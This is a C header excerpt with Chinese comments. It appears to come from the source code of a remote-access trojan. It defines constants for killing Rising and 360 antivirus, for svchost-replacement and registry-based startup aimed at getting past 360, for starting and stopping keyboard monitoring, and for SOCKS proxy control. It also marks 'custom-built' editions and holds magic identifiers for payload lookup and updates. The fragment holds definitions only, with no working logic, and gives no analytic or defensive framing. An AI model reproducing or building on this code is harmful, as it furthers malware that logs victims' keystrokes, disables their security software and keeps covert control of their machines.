...
#define WM_GET_MAIN_POINT		WM_USER + 442		//取主窗口对象指针
...
#define WM_CONNECT_SOCKS_STOP	8026				//关闭代理
#define WM_CONNECT_CLIENT_DOWN	8027				//客户退出
...
#define PS_LOCAL_START_SOCKS	9009				//开启socks
#define PS_LOCAL_CLIENT_DOWN	9010				//客户退出
...
#define _KILL_RAV				0x01
#define _KILL_360				0x02

//字串资源

#ifdef PS_VER_DINGZUO
	#define PS_VER_INFO				"高级定做"
#else
	#define PS_VER_INFO				"企业定做"
#endif
...
//DLL启动检查参数
#define PS_NORMAL_RUNDLL32		1000				//RUNDLL32正常启动
#define PS_NORMAL_SVCHOST_RP	1001				//SVCHOST替换启动
#define PS_NORMAL_360_MAKE_REG	1002				//启动DLL修改注册表
#define PS_NORMAL_360_MAKE_COPY	1003				//启动DLL修改注册表

//DLL传入参数
#define DLL_START_DLL			100001				//加载指定DLL
#define DLL_START_WORK			100002				//执行任务
#define DLL_START_INSTALL		100003				//安装启动
#define DLL_START_PCMAKE		100004				//直接启动pcmake.dll
#define DLL_START_PCMAIN		100005				//直接启动pcmain.dll
#define DLL_START_KEYSTART		100006				//启动键盘监控
#define DLL_START_KEYSTOP		100007				//停止键盘监控

#define DLL_LOAD_FLAG			999999				//启动标识
...
#define PS_START_NORMAL		11005		//正常启动

typedef struct _PSSAVEFILEINFO_
{
	...
	DWORD		m_SysFileLen;
	DWORD		m_ComFileLen;
}PSSAVEFILEINFO, *LPPSSAVEFILEINFO;

#define PS_USER_ID			0							//用户标识
#define PS_FIND_FLAG		0x1877665508776633 + 0		//字串标识
#define PS_UPDATA_FLAG		0x1827665508776633 + 0		//更新标识
#define PS_STARTUP_FLAG		0x2233466156389774	

#define PS_EXT_A			0x776345
#define PS_EXT_B			0x768723
#define PS_EXT_C			0x895676